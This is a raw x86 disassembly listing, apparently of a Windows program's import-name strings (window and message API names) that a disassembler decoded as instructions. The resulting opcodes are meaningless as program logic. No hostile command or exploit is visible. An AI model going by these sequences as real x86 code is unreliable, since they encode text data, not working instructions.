  428e82:	add    BYTE PTR [eax],al
  428e84:	add    al,BYTE PTR [eax]
  428e86:	inc    ecx
  428e87:	fs push 0x75
  428e8a:	jae    0x428f00
  428e8c:	push   edi
  428e8d:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  428e94:	arpl   WORD PTR [eax+eax*1+0x0],si
  428e98:	add    DWORD PTR [ecx],0x65536e49
  428e9e:	outs   dx,BYTE PTR ds:[esi]
  428e9f:	fs dec ebp
  428ea1:	gs jae 0x428f17
  428ea4:	popa   
  428ea5:	addr16 gs inc ebp
  428ea8:	js     0x428eaa
  428eaa:	xchg   BYTE PTR [ecx],al
  428eac:	dec    ecx
  428ead:	outs   dx,BYTE PTR ds:[esi]
  428eae:	jae    0x428f15
  428eb0:	jb     0x428f26
  428eb2:	dec    ebp
  428eb3:	outs   dx,BYTE PTR gs:[esi]
  428eb5:	jne    0x428f0e
  428eb7:	add    BYTE PTR ds:0x6c6c4100,al
  428ebd:	outs   dx,DWORD PTR ds:[esi]
  428ebe:	ja     0x428f13
  428ec0:	gs je  0x428f09
  428ec3:	outs   dx,DWORD PTR ds:[esi]
  428ec4:	jb     0x428f2b
  428ec6:	addr16 jb 0x428f38
  428ec9:	jne    0x428f39
  428ecb:	fs push edi
  428ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428ed4:	add    BYTE PTR [edx],0x53
  428ed7:	ja     0x428f3a
  428ed9:	jo     0x428f28
  428edb:	outs   dx,DWORD PTR ds:[esi]
  428edc:	jne    0x428f51
  428ede:	gs inc edx
  428ee0:	jne    0x428f56
  428ee2:	je     0x428f53
  428ee4:	outs   dx,BYTE PTR ds:[esi]
  428ee5:	add    bh,ch
  428ee7:	add    DWORD PTR [eax+0x65],edx
  428eea:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  428eef:	jae    0x428f52
  428ef1:	addr16 gs push edi
  428ef4:	add    BYTE PTR [eax],al
  428ef6:	cdq    
  428ef7:	add    BYTE PTR [ecx+ebp*2+0x61],al
  428efb:	ins    BYTE PTR es:[edi],dx
  428efc:	outs   dx,DWORD PTR ds:[esi]
  428efd:	addr16 inc edx
  428eff:	outs   dx,DWORD PTR ds:[esi]
  428f00:	js     0x428f4b
  428f02:	outs   dx,BYTE PTR ds:[esi]
  428f03:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428f0b:	jb     0x428f6e
  428f0d:	ins    DWORD PTR es:[edi],dx
  428f0e:	inc    ecx
  428f0f:	add    BYTE PTR [ebp+0x0],bl
  428f12:	inc    ebx
  428f13:	jb     0x428f7a
  428f15:	popa   
  428f16:	je     0x428f7d
  428f18:	dec    ecx
  428f19:	arpl   WORD PTR [edi+0x6e],bp
  428f1c:	dec    ecx
  428f1d:	outs   dx,BYTE PTR ds:[esi]
  428f1e:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  428f26:	stos   BYTE PTR es:[edi],al
  428f27:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428f2b:	fs inc edx
  428f2d:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb1005770
  428f35:	add    dl,BYTE PTR [esi+0x6b]
  428f38:	dec    ebx
  428f39:	gs jns 0x428f8f
  428f3c:	arpl   WORD PTR [ecx+0x6e],sp
  428f3f:	push   edi
  428f40:	add    BYTE PTR [eax],al
  428f42:	adc    eax,DWORD PTR [ecx]
  428f44:	inc    edi
  428f45:	gs je  0x428f8c
  428f48:	outs   dx,DWORD PTR ds:[esi]
  428f49:	jne    0x428fad
  428f4b:	ins    BYTE PTR es:[edi],dx
  428f4c:	gs inc ebx
  428f4e:	ins    BYTE PTR es:[edi],dx
  428f4f:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  428f56:	add    BYTE PTR [eax],al
  428f58:	add    WORD PTR [edi+0x65],ax
  428f5c:	je     0x428fb3
  428f5e:	jae    0x428fc5
  428f60:	jb     0x428fb1
  428f62:	bound  ebp,QWORD PTR [edx+0x65]
  428f65:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428f69:	outs   dx,WORD PTR ds:[esi]
  428f6b:	jb     0x428fda
  428f6d:	popa   
  428f6e:	je     0x428fd9
  428f70:	outs   dx,DWORD PTR ds:[esi]
  428f71:	outs   dx,BYTE PTR ds:[esi]
  428f72:	push   edi
  428f73:	add    BYTE PTR [eax+0x1],bl
  428f76:	inc    edi
  428f77:	gs je  0x428fcd
  428f7a:	jne    0x428fde
  428f7c:	dec    ebp
  428f7d:	outs   dx,BYTE PTR gs:[esi]
  428f7f:	jne    0x428f81
  428f81:	add    dh,dh
  428f83:	add    BYTE PTR [edi+0x65],al
  428f86:	je     0x428fcb
  428f88:	ins    BYTE PTR es:[edi],dx
  428f89:	popa   
  428f8a:	jae    0x428fff
  428f8c:	dec    ecx
  428f8d:	outs   dx,BYTE PTR ds:[esi]
  428f8e:	outs   dx,WORD PTR ds:[esi]
  428f90:	inc    ebp
  428f91:	js     0x428fea
  428f93:	add    BYTE PTR [ecx+eax*1],cl
  428f96:	inc    edi
  428f97:	gs je  0x428fde
  428f9a:	gs jae 0x429008
  428f9d:	je     0x42900e
  428f9f:	jo     0x428ff8
  428fa1:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428fa8:	sub    eax,0x6e655302
  428fad:	fs dec esi
  428faf:	outs   dx,DWORD PTR ds:[esi]
  428fb0:	je     0x42901b
  428fb2:	data16 jns 0x429002
  428fb5:	gs jae 0x42902b
  428fb8:	popa   
  428fb9:	addr16 gs push edi
  428fbc:	add    BYTE PTR [eax],al
  428fbe:	and    al,BYTE PTR [edx]
  428fc0:	push   ebx
  428fc1:	outs   dx,BYTE PTR gs:[esi]
  428fc3:	fs inc esp
  428fc5:	ins    BYTE PTR es:[edi],dx
  428fc6:	addr16 dec ecx
  428fc8:	je     0x42902f
  428fca:	ins    DWORD PTR es:[edi],dx
  428fcb:	dec    ebp
  428fcc:	gs jae 0x429042
  428fcf:	popa   
  428fd0:	addr16 gs push edi
  428fd3:	add    BYTE PTR [eax],ch
  428fd5:	add    DWORD PTR [edi+0x65],eax
  428fd8:	je     0x429026
  428fda:	popa   
  428fdb:	jae    0x429051
  428fdd:	inc    ecx
  428fde:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428fe2:	gs push eax
  428fe4:	outs   dx,DWORD PTR ds:[esi]
  428fe5:	jo     0x42905c
  428fe7:	jo     0x428fe9
  428fe9:	add    BYTE PTR [ecx],ch
  428feb:	add    BYTE PTR [ebx+0x68],al
  428fee:	popa   
  428fef:	jb     0x42903d
  428ff1:	outs   dx,DWORD PTR ds:[esi]
  428ff2:	ja     0x429059
  428ff4:	jb     0x42904d
  428ff6:	add    BYTE PTR [eax],al
  428ff8:	xor    al,BYTE PTR [ecx]
  428ffa:	inc    edi
  428ffb:	gs je  0x42904b
  428ffe:	outs   dx,BYTE PTR gs:[esi]
  429000:	jne    0x42904b
  429002:	je     0x429069
  429004:	ins    DWORD PTR es:[edi],dx
  429005:	inc    ebx
  429006:	outs   dx,DWORD PTR ds:[esi]
  429007:	jne    0x429077
  429009:	je     0x42900b
  42900b:	add    BYTE PTR ds:0x74655302,bh
  429011:	inc    esp
  429012:	ins    BYTE PTR es:[edi],dx
  429013:	addr16 dec ecx
  429015:	je     0x42907c
  429017:	ins    DWORD PTR es:[edi],dx
  429018:	dec    ecx
  429019:	outs   dx,BYTE PTR ds:[esi]
  42901a:	je     0x42901c
  42901c:	mov    al,ds:0x57734901
  429021:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  429028:	mov    ds:0x57734901,al
  42902d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  429034:	imul   esp,DWORD PTR [ebx+0x6f],0xe7006564
  42903b:	add    DWORD PTR [edi+0x70],ecx
  42903e:	outs   dx,BYTE PTR gs:[esi]
  429040:	inc    esp
  429041:	gs jae 0x4290af
  429044:	je     0x4290b5
  429046:	jo     0x42909f
  429048:	add    BYTE PTR [eax],al
  42904a:	cmp    al,BYTE PTR [eax]
  42904c:	inc    ebx
  42904d:	push   0x446b6365
  429052:	ins    BYTE PTR es:[edi],dx
  429053:	addr16 inc edx
  429055:	jne    0x4290cb
  429057:	je     0x4290c8
  429059:	outs   dx,BYTE PTR ds:[esi]
  42905a:	add    BYTE PTR [eax],al
  42905c:	mov    eax,DWORD PTR [ecx]
  42905e:	dec    ecx
  42905f:	outs   dx,BYTE PTR ds:[esi]
  429060:	jbe    0x4290c7
  429062:	jb     0x4290d8
  429064:	push   edx
  429065:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  42906a:	pop    DWORD PTR [eax]
  42906c:	inc    esp
  42906d:	gs push di
  429070:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  429077:	outs   dx,DWORD PTR ds:[esi]
  429078:	arpl   WORD PTR [edi+0x0],dx
  42907b:	add    BYTE PTR ds:0x74654701,cl
  429081:	inc    esp
  429082:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  429089:	jae    0x4290f0
  42908b:	push   ebp
  42908c:	outs   dx,BYTE PTR ds:[esi]
  42908d:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x47016500
  429095:	gs je  0x4290ed
  429098:	jae    0x4290ff
  42909a:	jb     0x4290eb
  42909c:	bound  ebp,QWORD PTR [edx+0x65]
  42909f:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  4290a3:	outs   dx,WORD PTR ds:[esi]
  4290a5:	jb     0x429114
  4290a7:	popa   
  4290a8:	je     0x429113
  4290aa:	outs   dx,DWORD PTR ds:[esi]
  4290ab:	outs   dx,BYTE PTR ds:[esi]
  4290ac:	inc    ecx
  4290ad:	add    BYTE PTR [ecx+0x44734901],bl
  4290b3:	ins    BYTE PTR es:[edi],dx
  4290b4:	addr16 inc edx
  4290b6:	jne    0x42912c
  4290b8:	je     0x429129
  4290ba:	outs   dx,BYTE PTR ds:[esi]
  4290bb:	inc    ebx
  4290bc:	push   0x656b6365
  4290c1:	add    BYTE PTR fs:[eax],al
  4290c4:	ins    DWORD PTR es:[edi],dx
  4290c5:	add    DWORD PTR [edi+0x65],eax
  4290c8:	je     0x429121
  4290ca:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4290d1:	outs   dx,BYTE PTR ds:[esi]
  4290d2:	addr16 push edi
  4290d4:	add    BYTE PTR [eax],al
  4290d6:	popa   
  4290d7:	add    BYTE PTR [ebx+0x72],al
  4290da:	gs popa 
  4290dc:	je     0x429143
  4290de:	push   eax
  4290df:	outs   dx,DWORD PTR ds:[esi]
  4290e0:	jo     0x429157
  4290e2:	jo     0x429131
  4290e4:	outs   dx,BYTE PTR gs:[esi]
  4290e6:	jne    0x4290e8
  4290e8:	sbb    eax,DWORD PTR [eax]
  4290ea:	inc    ebx
  4290eb:	popa   
  4290ec:	ins    BYTE PTR es:[edi],dx
  4290ed:	ins    BYTE PTR es:[edi],dx
  4290ee:	push   edi
  4290ef:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4290f6:	outs   dx,DWORD PTR ds:[esi]
  4290f7:	arpl   WORD PTR [edi+0x0],dx
  4290fa:	stos   DWORD PTR es:[edi],eax
  4290fb:	add    BYTE PTR [edx+esi*2+0x61],al
  4290ff:	ja     0x429142
  429101:	outs   dx,BYTE PTR ds:[esi]
  429102:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  429109:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  42910e:	sahf   
  42910f:	add    DWORD PTR [ecx+0x73],ecx
  429112:	push   edx
  429113:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  429118:	jo     0x42918e
  42911a:	jns    0x42911c
  42911c:	inc    BYTE PTR [eax]
  42911e:	inc    edi
  42911f:	gs je  0x429165
  429122:	ins    BYTE PTR es:[edi],dx
  429123:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  42912a:	jb     0x42912c
  42912c:	lds    eax,FWORD PTR [eax]
  42912e:	inc    ebp
  42912f:	outs   dx,BYTE PTR ds:[esi]
  429130:	fs push eax
  429132:	popa   
  429133:	imul   ebp,DWORD PTR [esi+0x74],0xdc0000
  42913a:	inc    ebp
  42913b:	outs   dx,BYTE PTR ds:[esi]
  42913c:	jne    0x4291ab
  42913e:	push   edi
  42913f:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  429146:	xchg   DWORD PTR [ecx],eax
  429148:	dec    ecx
  429149:	outs   dx,BYTE PTR ds:[esi]
  42914a:	je     0x4291b1
  42914c:	jb     0x4291bc
  42914e:	popa   
  42914f:	ins    BYTE PTR es:[edi],dx
  429150:	inc    edi
  429151:	gs je  0x4291ab
  429154:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  42915b:	js     0x4291d1
  42915d:	add    BYTE PTR [eax+0x43734901],dl
  429163:	push   0x6f4c7261
  429168:	ja     0x4291cf
  42916a:	jb     0x4291ad
  42916c:	add    BYTE PTR [eax],al
  42916e:	aad    0x1
  429170:	dec    ebp
  429171:	gs jae 0x4291e7
  429174:	popa   
  429175:	addr16 gs inc edx
  429178:	outs   dx,DWORD PTR ds:[esi]
  429179:	js     0x4291d2
  42917b:	add    BYTE PTR [edi+0x636f4c01],bh
  429181:	imul   edx,DWORD PTR [edi+0x69],0x6e
  429185:	outs   dx,DWORD PTR fs:[esi]
  429187:	ja     0x4291de
  429189:	jo     0x4291ef
  42918b:	popa   
  42918c:	je     0x4291f3
  42918e:	add    BYTE PTR [eax],al
  429190:	add    BYTE PTR es:[ebx+0x68],al
  429194:	popa   
  429195:	jb     0x4291e3
  429197:	outs   dx,DWORD PTR ds:[esi]
  429198:	ja     0x4291ff
  42919a:	jb     0x4291dd
  42919c:	add    BYTE PTR [eax],al
  42919e:	call   0x6e6f:0x696e5502
  4291a5:	push   edx
  4291a6:	arpl   WORD PTR gs:[eax+eax*1+0x38],si
  4291ab:	add    DWORD PTR [edi+0x65],eax
  4291ae:	je     0x4291fd
  4291b0:	outs   dx,BYTE PTR gs:[esi]
  4291b2:	jne    0x429207
  4291b4:	je     0x429228
  4291b6:	imul   ebp,DWORD PTR [esi+0x67],0xd9000041
  4291bd:	add    DWORD PTR [ebp+0x6f],ecx
  4291c0:	outs   dx,BYTE PTR ds:[esi]
  4291c1:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4291c9:	push   edx
  4291ca:	arpl   WORD PTR gs:[eax+eax*1+0x6d],si
  4291cf:	add    dl,BYTE PTR [ebx+0x65]
  4291d2:	je     0x42922b
  4291d4:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  4291db:	outs   dx,BYTE PTR ds:[esi]
  4291dc:	addr16 inc ecx
  4291de:	add    BYTE PTR [eax],al
  4291e0:	or     al,0x0
  4291e2:	inc    edx
  4291e3:	imul   ebp,DWORD PTR gs:[bp+0x44],0x72656665
  4291ec:	push   edi
  4291ed:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  4291f4:	jae    0x4291f6
  4291f6:	add    BYTE PTR cs:[ebx+0x68],al
  4291fa:	popa   
  4291fb:	jb     0x42924d
  4291fd:	jb     0x429264
  4291ff:	jbe    0x429242
  429201:	add    bl,bl
  429203:	add    DWORD PTR [ebp+0x6f],ecx
  429206:	jbe    0x42926d
  429208:	push   edi
  429209:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  429210:	mov    dh,0x1
  429212:	dec    esp
  429213:	outs   dx,DWORD PTR ds:[esi]
  429214:	popa   
  429215:	fs dec ebp
  429217:	outs   dx,BYTE PTR gs:[esi]
  429219:	jne    0x42925c
  42921b:	add    BYTE PTR [ebp+0x79656b02],bh
  429221:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  429225:	jbe    0x42928c
  429227:	outs   dx,BYTE PTR ds:[esi]
  429228:	je     0x42922a
  42922a:	pop    esp
  42922b:	add    DWORD PTR [edi+0x65],eax
  42922e:	je     0x429283
  429230:	jns    0x4292a5
  429232:	je     0x429299
  429234:	ins    DWORD PTR es:[edi],dx
  429235:	dec    ebp
  429236:	gs je  0x4292ab
  429239:	imul   esp,DWORD PTR [ebx+0x73],0x1af0000
  429240:	dec    esp
  429241:	outs   dx,DWORD PTR ds:[esi]
  429242:	popa   
  429243:	fs dec ecx
  429245:	arpl   WORD PTR [edi+0x6e],bp
  429248:	inc    ecx
  429249:	add    BYTE PTR [ebx+0x1],al
  42924c:	inc    edi
  42924d:	gs je  0x42929e
  429250:	gs js  0x4292c7
  429253:	inc    esp
  429254:	ins    BYTE PTR es:[edi],dx
  429255:	addr16 push esp
  429257:	popa   
  429258:	bound  ecx,QWORD PTR [ecx+0x74]
  42925b:	gs ins DWORD PTR es:[edi],dx
  42925d:	add    BYTE PTR [ebx+0x61724400],dh
  429263:	ja     0x4292ae
  429265:	arpl   WORD PTR [edi+0x6e],bp
  429268:	add    BYTE PTR [eax],al
  42926a:	std    
  42926b:	add    BYTE PTR [edi+0x65],al
  42926e:	je     0x4292b3
  429270:	ins    BYTE PTR es:[edi],dx
  429271:	imul   esp,DWORD PTR [ebp+0x6e],0x63655274
  429278:	je     0x42927a
  42927a:	add    DWORD PTR ds:[edi+0x65],eax
  42927e:	je     0x4292cd
  429280:	gs jae 0x4292f6
  429283:	popa   
  429284:	addr16 gs push edi
  429287:	add    BYTE PTR [edx+0x1],al
  42928a:	inc    edi
  42928b:	gs je  0x4292dc
  42928e:	gs js  0x429305
  429291:	inc    esp
  429292:	ins    BYTE PTR es:[edi],dx
  429293:	addr16 inc edi
  429295:	jb     0x429306
  429297:	jne    0x429309
  429299:	dec    ecx
  42929a:	je     0x429301
  42929c:	ins    DWORD PTR es:[edi],dx
  42929d:	add    BYTE PTR ds:0x6c655202,dl
  4292a3:	gs popa 
  4292a5:	jae    0x42930c
  4292a7:	inc    esp
  4292a8:	inc    ebx
  4292a9:	add    BYTE PTR [ebp+0x53],dl
  4292ac:	inc    ebp
  4292ad:	push   edx
  4292ae:	xor    esi,DWORD PTR [edx]
  4292b0:	cs fs ins BYTE PTR es:[edi],dx
  4292b3:	ins    BYTE PTR es:[edi],dx
  4292b4:	add    BYTE PTR [eax],al
  4292b6:	add    ecx,DWORD PTR ss:[ebp+0x6f]
  4292ba:	jbe    0x429321
  4292bc:	inc    esi
  4292bd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x71004178
  4292c5:	add    DWORD PTR [esi+0x69],eax
  4292c8:	outs   dx,BYTE PTR ds:[esi]
  4292c9:	fs push edx
  4292cb:	gs jae 0x42933d
  4292ce:	jne    0x429342
  4292d0:	arpl   WORD PTR [ebp+0x45],sp
  4292d3:	js     0x42932c
  4292d5:	add    BYTE PTR [ebx],dl
  4292d7:	add    al,0x53
  4292d9:	gs je  0x42931f
  4292dc:	jne    0x429350
  4292de:	jb     0x429345
  4292e0:	outs   dx,BYTE PTR ds:[esi]
  4292e1:	je     0x429327
  4292e3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4292ea:	jns    0x42932d
  4292ec:	add    BYTE PTR [eax],al
  4292ee:	sub    BYTE PTR [ebx+edx*2],al
  4292f1:	gs je  0x42933c
  4292f4:	popa   
  4292f5:	outs   dx,BYTE PTR ds:[esi]
  4292f6:	fs ins BYTE PTR es:[edi],dx
  4292f8:	gs inc ebx
  4292fa:	outs   dx,DWORD PTR ds:[esi]
  4292fb:	jne    0x42936b
  4292fd:	je     0x4292ff
  4292ff:	add    BYTE PTR [ebx+0x6d6f4300],dh
  429305:	jo     0x429368
  429307:	jb     0x42936e
  429309:	push   ebx
  42930a:	je     0x42937e
  42930c:	imul   ebp,DWORD PTR [esi+0x67],0x52000041
  429313:	add    DWORD PTR [esi+0x69],eax
  429316:	ins    BYTE PTR es:[edi],dx
  429317:	gs push esp
  429319:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  429320:	arpl   WORD PTR [ecx+0x6c],sp
  429323:	inc    esi
  429324:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  42932c:	cmp    eax,DWORD PTR [ebx+edx*2]
  42932f:	gs je  0x429385
  429332:	jns    0x4293a7
  429334:	je     0x42939b
  429336:	ins    DWORD PTR es:[edi],dx
  429337:	push   esp
  429338:	imul   ebp,DWORD PTR [ebp+0x65],0x47018e00
  42933f:	gs je  0x429383
  429342:	inc    ebx
  429343:	push   eax
  429344:	add    BYTE PTR [eax],al
  429346:	arpl   WORD PTR [ecx],ax
  429348:	inc    esi
  429349:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  429350:	je     0x429398
  429352:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x33f0000
  42935a:	dec    esp
  42935b:	outs   dx,DWORD PTR ds:[esi]
  42935c:	popa   
  42935d:	fs dec esp
  42935f:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  429366:	add    BYTE PTR [eax],al
  429368:	push   ss
  429369:	add    DWORD PTR [ebp+0x6e],eax
  42936c:	je     0x4293d3
  42936e:	jb     0x4293b3
  429370:	jb     0x4293db
  429372:	je     0x4293dd
  429374:	arpl   WORD PTR [ecx+0x6c],sp
  429377:	push   ebx
  429378:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  42937d:	outs   dx,BYTE PTR ds:[esi]
  42937e:	add    BYTE PTR [eax],al
  429380:	cdq    
  429381:	add    DWORD PTR [edi+0x65],eax
  429384:	je     0x4293c9
  429386:	outs   dx,DWORD PTR ds:[esi]
  429387:	ins    DWORD PTR es:[edi],dx
  429388:	ins    DWORD PTR es:[edi],dx
  429389:	inc    ebx
  42938a:	outs   dx,DWORD PTR ds:[esi]
  42938b:	outs   dx,BYTE PTR ds:[esi]
  42938c:	imul   sp,WORD PTR [edi+0x0],0x188
  429392:	inc    esi
  429393:	jb     0x4293fa
  429395:	gs push edx
  429397:	gs jae 0x429409
  42939a:	jne    0x42940e
  42939c:	arpl   WORD PTR [ebp+0x0],sp
  42939f:	add    BYTE PTR [eax+0x1],ah
  4293a2:	inc    esi
  4293a3:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  4293aa:	je     0x4293f2
  4293ac:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x1930000
  4293b4:	inc    edi
  4293b5:	gs je  0x4293fa
  4293b8:	imul   ebp,DWORD PTR [esi+0x61],0x79547972
  4293bf:	jo     0x429426
  4293c1:	push   edi
  4293c2:	add    BYTE PTR [eax],al
  4293c4:	fiadd  WORD PTR [esp+ebp*2]
  4293c7:	jae    0x42943d
  4293c9:	jb     0x429437
  4293cb:	outs   dx,BYTE PTR gs:[esi]
  4293cd:	push   edi
  4293ce:	add    BYTE PTR [eax],al
  4293d0:	pop    ds
  4293d1:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4293d5:	popa   
  4293d6:	ins    BYTE PTR es:[edi],dx
  4293d7:	push   ebx
  4293d8:	imul   edi,DWORD PTR [edx+0x65],0x47025700
  4293df:	gs je  0x429435
  4293e2:	jns    0x429457
  4293e4:	je     0x42944b
  4293e6:	ins    DWORD PTR es:[edi],dx
  4293e7:	inc    esp
  4293e8:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4293ef:	jns    0x429432
  4293f1:	add    BYTE PTR [esi+0x74654701],ah
  4293f7:	inc    ebx
  4293f8:	outs   dx,DWORD PTR ds:[esi]
  4293f9:	ins    DWORD PTR es:[edi],dx
  4293fa:	jo     0x429471
  4293fc:	je     0x429463
  4293fe:	jb     0x42944e
  429400:	popa   
  429401:	ins    DWORD PTR es:[edi],dx
  429402:	gs push edi
  429404:	add    BYTE PTR [eax],al
  429406:	rol    BYTE PTR [eax],cl
  429408:	inc    ebx
  429409:	jb     0x429470
  42940b:	popa   
  42940c:	je     0x429473
  42940e:	inc    esi
  42940f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  429417:	outs   dx,BYTE PTR ds:[esi]
  429418:	addr16 inc ecx
  42941a:	add    BYTE PTR [eax],al
  42941c:	retf   0x4300
  42941f:	jb     0x429486
  429421:	popa   
  429422:	je     0x429489
  429424:	inc    esp
  429425:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  42942c:	jns    0x429485
  42942e:	add    BYTE PTR [eax],al
  429430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429431:	add    BYTE PTR [ebx+0x61],al
  429434:	outs   dx,BYTE PTR ds:[esi]
  429435:	arpl   WORD PTR [ebp+0x6c],sp
  429438:	push   edi
  429439:	popa   
  42943a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  429442:	ins    DWORD PTR es:[edi],dx
  429443:	gs jb  0x429446
  429446:	add    al,0x2
  429448:	inc    edi
  429449:	gs je  0x429498
  42944c:	outs   dx,DWORD PTR ds:[esi]
  42944d:	arpl   WORD PTR [ecx+0x6c],sp
  429450:	gs dec ecx
  429452:	outs   dx,BYTE PTR ds:[esi]
  429453:	outs   dx,WORD PTR ds:[esi]
  429455:	inc    ecx
  429456:	add    BYTE PTR [eax],al
  429458:	xor    eax,0x766f4d03
  42945d:	gs inc esi
  42945f:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47019d00
  429467:	gs je  0x4294ad
  42946a:	outs   dx,DWORD PTR ds:[esi]
  42946b:	ins    DWORD PTR es:[edi],dx
  42946c:	ins    DWORD PTR es:[edi],dx
  42946d:	push   ebx
  42946e:	je     0x4294d1
  429470:	je     0x4294d7
  429472:	add    BYTE PTR [eax],al
  429474:	mov    ah,0x3
  429476:	push   edx
  429477:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x61577265
  429480:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  429488:	ins    BYTE PTR es:[di],dx
  42948a:	gs dec edi
  42948c:	bound  ebp,QWORD PTR [edx+0x65]
  42948f:	arpl   WORD PTR [eax+eax*1+0x5d],si
  429493:	add    al,BYTE PTR [edi+0x65]
  429496:	je     0x4294eb
  429498:	jns    0x42950d
  42949a:	je     0x429501
  42949c:	ins    DWORD PTR es:[edi],dx
  42949d:	push   esp
  42949e:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  4294a5:	jae    0x42951b
  4294a7:	ins    DWORD PTR es:[edi],dx
  4294a8:	outs   dx,BYTE PTR gs:[esi]
  4294aa:	je     0x4294ac
  4294ac:	add    al,0x1
  4294ae:	inc    esp
  4294af:	gs ins BYTE PTR es:[edi],dx
  4294b1:	gs je  0x429519
  4294b4:	inc    esi
  4294b5:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47024900
  4294bd:	gs je  0x429513
  4294c0:	push   0x5074726f
  4294c5:	popa   
  4294c6:	je     0x429530
  4294c8:	dec    esi
  4294c9:	popa   
  4294ca:	ins    DWORD PTR es:[edi],dx
  4294cb:	gs inc ecx
  4294cd:	add    BYTE PTR [edx],al
  4294cf:	add    DWORD PTR [ebp+eiz*2+0x6c],eax
  4294d3:	gs je  0x42953b
  4294d6:	inc    ebx
  4294d7:	jb     0x429542
  4294d9:	je     0x429544
  4294db:	arpl   WORD PTR [ecx+0x6c],sp
  4294de:	push   ebx
  4294df:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4294e4:	outs   dx,BYTE PTR ds:[esi]
  4294e5:	add    bl,ah
  4294e7:	add    BYTE PTR [ebx+0x72],al
  4294ea:	gs popa 
  4294ec:	je     0x429553
  4294ee:	dec    esi
  4294ef:	popa   
  4294f0:	ins    DWORD PTR es:[edi],dx
  4294f1:	gs fs push eax
  4294f4:	imul   esi,DWORD PTR [eax+0x65],0xd4000057
  4294fb:	add    cl,BYTE PTR [ecx+0x73]
  4294fe:	inc    edx
  4294ff:	popa   
  429500:	fs push edx
  429502:	gs popa 
  429504:	fs push eax
  429506:	je     0x42957a
  429508:	add    BYTE PTR [eax],al
  42950a:	jnp    0x42950e
  42950c:	inc    edi
  42950d:	gs je  0x429565
  429510:	jae    0x429577
  429512:	jb     0x429558
  429514:	gs popaw 
  429517:	jne    0x429585
  429519:	je     0x429567
  42951b:	inc    ebx
  42951c:	dec    ecx
  42951d:	inc    esp
  42951e:	add    BYTE PTR [eax],al
  429520:	inc    ebp
  429521:	add    al,BYTE PTR [edi+0x65]
  429524:	je     0x429576
  429526:	jb     0x429597
  429528:	arpl   WORD PTR [ecx+0x64],ax
  42952b:	fs jb  0x429593
  42952e:	jae    0x4295a3
  429530:	add    BYTE PTR [eax],al
  429532:	mov    BYTE PTR [ebx],0x52
  429535:	gs jae 0x42959d
  429538:	je     0x42957f
  42953a:	jbe    0x4295a1
  42953c:	outs   dx,BYTE PTR ds:[esi]
  42953d:	je     0x42953f
  42953f:	add    BYTE PTR [edx+0x656c4300],ch
  429545:	popa   
  429546:	jb     0x42958b
  429548:	outs   dx,DWORD PTR ds:[esi]
  429549:	ins    DWORD PTR es:[edi],dx
  42954a:	ins    DWORD PTR es:[edi],dx
  42954b:	inc    ebp
  42954c:	jb     0x4295c0
  42954e:	outs   dx,DWORD PTR ds:[esi]
  42954f:	jb     0x429551
  429551:	add    BYTE PTR [eax+0x61654802],bh
  429557:	jo     0x4295ae
  429559:	outs   dx,BYTE PTR ds:[esi]
  42955a:	ins    BYTE PTR es:[edi],dx
  42955b:	outs   dx,DWORD PTR ds:[esi]
  42955c:	arpl   WORD PTR [ebx+0x0],bp
  42955f:	add    dh,ch
  429561:	add    edx,DWORD PTR [ebx+0x65]
  429564:	je     0x4295a9
  429566:	outs   dx,DWORD PTR ds:[esi]
  429567:	ins    DWORD PTR es:[edi],dx
  429568:	ins    DWORD PTR es:[edi],dx
  429569:	push   ebx
  42956a:	je     0x4295cd
  42956c:	je     0x4295d3
  42956e:	add    BYTE PTR [eax],al
  429570:	out    dx,eax
